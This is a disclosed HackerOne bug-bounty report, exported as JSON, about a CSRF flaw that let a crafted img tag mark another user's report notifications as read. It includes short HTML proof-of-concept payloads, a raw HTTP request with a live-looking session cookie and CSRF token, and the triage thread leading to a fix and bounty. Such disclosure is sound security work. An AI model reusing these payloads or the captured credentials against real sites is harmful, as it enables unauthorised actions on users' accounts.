{"id":5946,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81OTQ2","url":"https://hackerone.com/reports/5946","title":"Marking notifications as read CSRF bug","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-04-05T12:35:00.350Z","submitted_at":"2014-04-05T12:35:00.350Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"redkan","url":"/redkan","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-04-28T15:37:35.678Z","bug_reporter_agreed_on_going_public_at":"2015-04-28T15:37:33.985Z","team_member_agreed_on_going_public_at":"2015-04-28T04:46:57.210Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"how to make unread notifications read!\r\n\r\n\u003chtml\u003e\r\n\u003cimg src=\"https://hackerone.com/notifications/mark_as_read\"\u003e\r\n\u003c/html\u003e\r\n\r\nthis happens cause of \r\n\r\nGET https://hackerone.com/notifications/mark_as_read\r\n\r\nHost: hackerone.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nX-CSRF-Token: Na8xdZXgeO1e0ftxuD/iLIOalL1xRQj2dCmU8Y+Mt+g=\r\nX-Requested-With: XMLHttpRequest\r\nReferer: https://hackerone.com/bugs?team_id=0\u0026sort_type=latest_activity\u0026sort_direction=descending\u0026state=open\u0026limit=25\u0026page=1\u0026substates%5B%5D=new\u0026substates%5B%5D=triaged\u0026substates%5B%5D=resolved\u0026substates%5B%5D=wont-fix\u0026substates%5B%5D=not-applicable\u0026substates%5B%5D=duplicate\u0026user_id=3796\r\nCookie: __cfduid=d09855ebf13c356aec9be0483be340bdb1393848505568; session=cXI3bitOSnhUZkxoL0h5cXUxQ0Erbnh4V1RLU3ViMTFiTUdrOFQ0aFN6YkdRbW9vblp4YThPQmhuZmhhaGlsWDdCVjQrd2xQSVZ3UnFCN0hCWWgyUzVRRTVTaThjM0RmWmY0Q2FaRzJlT00xRnVTQ2d5MmZSdUQ3SmN6LzdWSm9vQUhnYTNoU3AwTGhJMXUxMHM1VG11Y1RHVitwVDBRWDlLK282bzdqVFAxUytGemlIZDBSa040Z1pzcE1jSFk2bWJNMUVvdWExRWxKQXU1ZEJWalhXUDIxeU9QcmJaQ1AvVXBxVnNQR3o1eUFmNmZ6Y1E5M05qRkZUV29sdityTmhhSnJXTVNQVitQTm04NkVVejU4Z2lCdG1yb0laYTRDQWRQemRFcDNEVlpVaTdMRDNtUWN5TGFnL1F0RHlGTVBoZFBTcnRhZWdBZVhMNmhMaTZrcHQ3dGVSQ3RWNmorVFVtaWZTdmNLSVNGTVBpNENNVmNpZDZPODJyRkRQZU84YVZVaGZRRnJqZDZJUnJJamNUUnBmZGtEUWJ5aEIreFlZbUlqQ01peW9tZWhtZWFPd2FzemJVczVlTGo3RmZSRFRoUUJLOEZtTVp0OXpRSWJ3Zkc0R1l4dUc2ZEMwZWJxaEczM2tXU3V3RjdFem1lUEVyZHR1U2VSSlFHRXgwZXg5ald4V1ZFUXk4a21VbjNMcG9DQkYrWENMTkI2YTM5L2RraXlreS9oNUdFRjhuaG1EUGp2Um81L3JFU3hWV0Uxb1YxUy9kTUJRK3pTUnlDaGNCd01FcGpHNWpXSnBhZVU4YXh1M1VKdlQrRDIvVUE0RUVIZEk2a295YUJhSzFQY2s3K0w0NDVGVENFekpWZzV5RzV3ZHc9PS0tZnZoZ282b1pLSHorbkZhOSszT3pBUT09--6c21f21340f74a1b2badef42f92c0de2973c77b2; request_method=GET\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nContent-Length: 0\r\n\r\n\r\nhow to make a particular request\r\n\r\n\u003chtml\u003e\r\n\u003cimg src=\"https://hackerone.com/reports/5315\"\u003e\r\n\u003c/html\u003e\r\n\r\n\r\nreplace 5315 with victims report id","vulnerability_information_html":"\u003cp\u003ehow to make unread notifications read!\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;img src=\u0026quot;https://hackerone.com/notifications/mark_as_read\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003ethis happens cause of \u003c/p\u003e\n\n\u003cp\u003eGET \u003ca title=\"https://hackerone.com/notifications/mark_as_read\" href=\"https://hackerone.com/notifications/mark_as_read\"\u003ehttps://hackerone.com/notifications/mark_as_read\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHost: hackerone.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nX-CSRF-Token: Na8xdZXgeO1e0ftxuD/iLIOalL1xRQj2dCmU8Y+Mt+g=\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nReferer: \u003ca title=\"https://hackerone.com/bugs?team_id=0\u0026amp;sort_type=latest_activity\u0026amp;sort_direction=descending\u0026amp;state=open\u0026amp;limit=25\u0026amp;page=1\u0026amp;substates%5B%5D=new\u0026amp;substates%5B%5D=triaged\u0026amp;substates%5B%5D=resolved\u0026amp;substates%5B%5D=wont-fix\u0026amp;substates%5B%5D=not-applicable\u0026amp;substates%5B%5D=duplicate\u0026amp;user_id=3796\" href=\"https://hackerone.com/bugs?team_id=0\u0026amp;sort_type=latest_activity\u0026amp;sort_direction=descending\u0026amp;state=open\u0026amp;limit=25\u0026amp;page=1\u0026amp;substates%5B%5D=new\u0026amp;substates%5B%5D=triaged\u0026amp;substates%5B%5D=resolved\u0026amp;substates%5B%5D=wont-fix\u0026amp;substates%5B%5D=not-applicable\u0026amp;substates%5B%5D=duplicate\u0026amp;user_id=3796\"\u003ehttps://hackerone.com/bugs?team_id=0\u0026amp;sort_type=latest_activity\u0026amp;sort_direction=descending\u0026amp;state=open\u0026amp;limit=25\u0026amp;page=1\u0026amp;substates%5B%5D=new\u0026amp;substates%5B%5D=triaged\u0026amp;substates%5B%5D=resolved\u0026amp;substates%5B%5D=wont-fix\u0026amp;substates%5B%5D=not-applicable\u0026amp;substates%5B%5D=duplicate\u0026amp;user_id=3796\u003c/a\u003e\u003cbr\u003e\nCookie: __cfduid=d09855ebf13c356aec9be0483be340bdb1393848505568; session=cXI3bitOSnhUZkxoL0h5cXUxQ0Erbnh4V1RLU3ViMTFiTUdrOFQ0aFN6YkdRbW9vblp4YThPQmhuZmhhaGlsWDdCVjQrd2xQSVZ3UnFCN0hCWWgyUzVRRTVTaThjM0RmWmY0Q2FaRzJlT00xRnVTQ2d5MmZSdUQ3SmN6LzdWSm9vQUhnYTNoU3AwTGhJMXUxMHM1VG11Y1RHVitwVDBRWDlLK282bzdqVFAxUytGemlIZDBSa040Z1pzcE1jSFk2bWJNMUVvdWExRWxKQXU1ZEJWalhXUDIxeU9QcmJaQ1AvVXBxVnNQR3o1eUFmNmZ6Y1E5M05qRkZUV29sdityTmhhSnJXTVNQVitQTm04NkVVejU4Z2lCdG1yb0laYTRDQWRQemRFcDNEVlpVaTdMRDNtUWN5TGFnL1F0RHlGTVBoZFBTcnRhZWdBZVhMNmhMaTZrcHQ3dGVSQ3RWNmorVFVtaWZTdmNLSVNGTVBpNENNVmNpZDZPODJyRkRQZU84YVZVaGZRRnJqZDZJUnJJamNUUnBmZGtEUWJ5aEIreFlZbUlqQ01peW9tZWhtZWFPd2FzemJVczVlTGo3RmZSRFRoUUJLOEZtTVp0OXpRSWJ3Zkc0R1l4dUc2ZEMwZWJxaEczM2tXU3V3RjdFem1lUEVyZHR1U2VSSlFHRXgwZXg5ald4V1ZFUXk4a21VbjNMcG9DQkYrWENMTkI2YTM5L2RraXlreS9oNUdFRjhuaG1EUGp2Um81L3JFU3hWV0Uxb1YxUy9kTUJRK3pTUnlDaGNCd01FcGpHNWpXSnBhZVU4YXh1M1VKdlQrRDIvVUE0RUVIZEk2a295YUJhSzFQY2s3K0w0NDVGVENFekpWZzV5RzV3ZHc9PS0tZnZoZ282b1pLSHorbkZhOSszT3pBUT09--6c21f21340f74a1b2badef42f92c0de2973c77b2; request_method=GET\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nPragma: no-cache\u003cbr\u003e\nCache-Control: no-cache\u003cbr\u003e\nContent-Length: 0\u003c/p\u003e\n\n\u003cp\u003ehow to make a particular request\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;img src=\u0026quot;https://hackerone.com/reports/5315\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003ereplace 5315 with victims report id\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-05-28T04:46:57.966Z","allow_singular_disclosure_after":-176434936.86294192,"singular_disclosure_allowed":true,"vote_count":2,"voters":["sw33tlie","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":24720,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @hungry-soul, thanks for your submission. If I'm correct, you reported two CSRF issues:\n\n1. It's possible to send a GET request to the `/notifications/mark_as_read` route to mark certain notifications as read (it only responds to a POST request with a valid `X-CSRF-Token`)\n2. An issue that when you request a report, lets say #5315 like you used in your example, it marks unread notifications in that report as read\n\nI'm unable to reproduce the first issue. I'm getting a 404 response when I send a GET request to the route. The second issue is a creative find, although it lacks impact because we also notify people through email. I'll discuss this with the team and get back to you.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hungry-soul\"\u003e@hungry-soul\u003c/a\u003e, thanks for your submission. If I\u0026#39;m correct, you reported two CSRF issues:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIt\u0026#39;s possible to send a GET request to the \u003ccode\u003e/notifications/mark_as_read\u003c/code\u003e route to mark certain notifications as read (it only responds to a POST request with a valid \u003ccode\u003eX-CSRF-Token\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eAn issue that when you request a report, lets say \u003ca href=\"/reports/5315\"\u003e#5315\u003c/a\u003e like you used in your example, it marks unread notifications in that report as read\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI\u0026#39;m unable to reproduce the first issue. I\u0026#39;m getting a 404 response when I send a GET request to the route. The second issue is a creative find, although it lacks impact because we also notify people through email. I\u0026#39;ll discuss this with the team and get back to you.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-06T09:31:48.080Z","updated_at":"2014-04-06T09:31:48.080Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":24849,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"oops! sorry with the 1st one, rechecked it.!\nit's a post request and din't notice the csrf token in headers.\n\nBut the 2nd is legit :)","markdown_message":"\u003cp\u003eoops! sorry with the 1st one, rechecked it.!\u003cbr\u003e\nit\u0026#39;s a post request and din\u0026#39;t notice the csrf token in headers.\u003c/p\u003e\n\n\u003cp\u003eBut the 2nd is legit :)\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-06T15:49:27.575Z","updated_at":"2014-04-06T15:49:27.575Z","actor":{"username":"redkan","cleared":false,"url":"/redkan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":41110,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey jobert may i get an update on this please ? :)","markdown_message":"\u003cp\u003eHey jobert may i get an update on this please ? :)\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-29T03:16:21.673Z","updated_at":"2014-04-29T03:16:21.673Z","actor":{"username":"redkan","cleared":false,"url":"/redkan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":41158,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @hungry-soul, thanks for following up and sorry for not getting back to you earlier. The dev team is still working on a fix. I'll get back to you as soon as we released it. Give it a few more days. Thanks again, really like the creativity of the bug!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/hungry-soul\"\u003e@hungry-soul\u003c/a\u003e, thanks for following up and sorry for not getting back to you earlier. The dev team is still working on a fix. I\u0026#39;ll get back to you as soon as we released it. Give it a few more days. Thanks again, really like the creativity of the bug!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-29T07:28:13.194Z","updated_at":"2014-04-29T07:28:13.194Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":51702,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We just landed a fix for this in production. Marking notifications associated with a certain report as read through CSRF should no longer be possible! Thanks for reporting this.","markdown_message":"\u003cp\u003eWe just landed a fix for this in production. Marking notifications associated with a certain report as read through CSRF should no longer be possible! Thanks for reporting this.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-05-15T16:28:37.680Z","updated_at":"2014-05-15T16:29:06.031Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"redkan","url":"/redkan"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":51703,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-15T16:28:43.166Z","updated_at":"2014-05-15T16:28:43.166Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"redkan","url":"/redkan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":392179,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-28T04:46:57.333Z","updated_at":"2015-04-28T04:46:57.333Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":392762,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-28T15:37:34.102Z","updated_at":"2015-04-28T15:37:34.102Z","actor":{"username":"redkan","cleared":false,"url":"/redkan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":392763,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-28T15:37:35.741Z","updated_at":"2015-04-28T15:37:35.741Z","actor":{"username":"redkan","cleared":false,"url":"/redkan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":392822,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-28T16:41:42.199Z","updated_at":"2015-04-28T16:41:42.199Z","additional_data":{"old_title":"csrf bug","new_title":"Marking notifications as read CSRF bug"},"actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}